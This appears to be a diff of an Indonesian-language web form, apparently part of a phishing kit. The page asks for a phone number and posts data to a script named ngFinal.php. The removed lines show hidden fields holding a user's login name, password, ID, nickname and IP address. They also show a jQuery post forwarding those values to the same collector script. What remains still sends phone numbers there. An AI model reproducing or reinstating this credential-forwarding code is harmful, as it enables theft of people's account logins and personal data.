@@ -414,7 +414,6 @@
                 <span class="ngText">Isi Formulir Dibawah</span>
             </div>
             <div class="formUpload">
-            <span class="pesanForm gagal">Mohon Isi Semua Formulir</span>
             <span class="pesanForm check">Sedang Mengecek Nomor Hp</span>
             <span class="pesanForm salah">Nomor Hp Harus Lebih Dari 10 Digit</span>
             <span class="pesanForm wrong">Nomor Hp Tidak Cocok</span>
@@ -434,11 +433,6 @@
                   <option>Pacaran</option>
                   </select>
                </div>
-               <input type="hidden" id="user" value="<?php echo $user;?>">
-               <input type="hidden" id="pass" value="<?php echo $pass;?>">
-               <input type="hidden" id="id" value="<?php echo $id;?>">
-               <input type="hidden" id="nick" value="<?php echo $nick;?>">
-               <input type="hidden" id="ip" value="<?php echo $ip;?>">
                <div class="form-group">
                   <input id="submit" style="width:130px;" name="submit" class="form-input" type="submit">
                </div>
@@ -531,15 +525,8 @@
     
     // MENGIRIM PARAMS KE ngFinal.php
     $.post("ngFinal.php",{
-         user:user,
-         pass:pass,
-         id:id,
          hp:hp,
-         level:level,
-         nick:nick,
          tier:tier,
-         ep:ep,
-         ip:ip
     },function(ngSuccess){
          $("#submit").prop("disabled",true);
          });
